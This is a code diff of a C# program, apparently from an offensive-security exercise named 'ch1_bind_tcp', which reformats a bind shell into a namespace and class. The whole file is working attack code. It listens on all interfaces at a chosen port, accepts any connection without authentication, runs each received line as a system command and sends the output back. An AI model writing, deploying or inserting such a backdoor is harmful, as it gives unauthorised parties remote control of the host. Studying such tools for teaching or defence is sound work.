@@ -1,50 +1,57 @@
 //When running use like so /tmp/bind_tcp.exe 4444
+using System;
 
-public static void Main(string[] args) {
-  int port = int.Parse (args [0]);
-  TcpListener listener = new TcpListener(IPAddress.Any, port);
+namespace ch1_bind_tcp {
 
-  try {
-    listener.Start();
-  } catch {
-    return;
-  }
+  class MainClass {
+    
+    public static void Main(string[] args) {
+      int port = int.Parse (args [0]);
+      TcpListener listener = new TcpListener(IPAddress.Any, port);
 
-  while (true) {
-    using (Socket socket = listener.AcceptSocket()) {
-      using (NetworkStream stream = new NetworkStream(socket)) {
-        using (StreamReader rdr = new StreamReader(stream)) {
-          while (true) {
-            string cmd = rdr.ReadLine();
+      try {
+        listener.Start();
+      } catch {
+        return;
+      }
 
-            if (string.IsNullOrEmpty(cmd)) {
-              rdr.Close();
-              stream.Close();
-              listener.Stop();
-              break;
-            }
+      while (true) {
+        using (Socket socket = listener.AcceptSocket()) {
+          using (NetworkStream stream = new NetworkStream(socket)) {
+            using (StreamReader rdr = new StreamReader(stream)) {
+              while (true) {
+                string cmd = rdr.ReadLine();
 
-            if (string.IsNullOrWhiteSpace(cmd))
-              continue;
+                if (string.IsNullOrEmpty(cmd)) {
+                  rdr.Close();
+                  stream.Close();
+                  listener.Stop();
+                  break;
+                }
 
-            string[] split = cmd.Trim().Split(' ');
-            string filename = split.First();
-            string arg = string.Join(" ", split.Skip(1));
+                if (string.IsNullOrWhiteSpace(cmd))
+                  continue;
 
-            try {
-              Process prc = new Process();
-              prc.StartInfo = new ProcessStartInfo();
-              prc.StartInfo.FileName = filename;
-              prc.StartInfo.Arguments = arg;
-              prc.StartInfo.UseShellExecute = false;
-              prc.StartInfo.RedirectStandardOutput = true;
-              prc.Start();
-              prc.StandardOutput.BaseStream.CopyTo(stream);
-              prc.WaitForExit();
-            } catch {
-              string error = "Error running command " + cmd + "\n";
-              byte[] errorBytes = Encoding.ASCII.GetBytes(error);
-              stream.Write(errorBytes, 0, errorBytes.Length);
+                string[] split = cmd.Trim().Split(' ');
+                string filename = split.First();
+                string arg = string.Join(" ", split.Skip(1));
+
+                try {
+                  Process prc = new Process();
+                  prc.StartInfo = new ProcessStartInfo();
+                  prc.StartInfo.FileName = filename;
+                  prc.StartInfo.Arguments = arg;
+                  prc.StartInfo.UseShellExecute = false;
+                  prc.StartInfo.RedirectStandardOutput = true;
+                  prc.Start();
+                  prc.StandardOutput.BaseStream.CopyTo(stream);
+                  prc.WaitForExit();
+                } catch {
+                  string error = "Error running command " + cmd + "\n";
+                  byte[] errorBytes = Encoding.ASCII.GetBytes(error);
+                  stream.Write(errorBytes, 0, errorBytes.Length);
+                }
+              }
             }
           }
         }
